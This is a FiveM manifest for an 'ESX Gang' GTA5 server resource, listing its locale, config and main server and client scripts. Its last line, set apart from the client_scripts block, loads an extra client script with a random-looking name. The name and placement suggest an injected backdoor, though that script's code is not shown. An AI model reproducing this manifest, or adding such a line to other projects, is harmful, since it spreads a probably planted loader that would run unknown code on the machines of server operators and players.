fx_version 'bodacious'
game 'gta5'

description 'ESX Gang'

version '1.0.1'

server_scripts {
  '@essentialmode/locale.lua',
  'locales/br.lua',
  'locales/en.lua',
  'locales/fr.lua',
  'locales/es.lua',
  '@mysql_async/lib/MySQL.lua',
  'config.lua',
  'server/main.lua'
}

client_scripts {
  '@essentialmode/locale.lua',
  'locales/br.lua',
  'locales/en.lua',
  'locales/fr.lua',
  'locales/es.lua',
  'config.lua',
  'client/main.lua'
}

client_script "DISqkiIEcVydGenWnD.lua"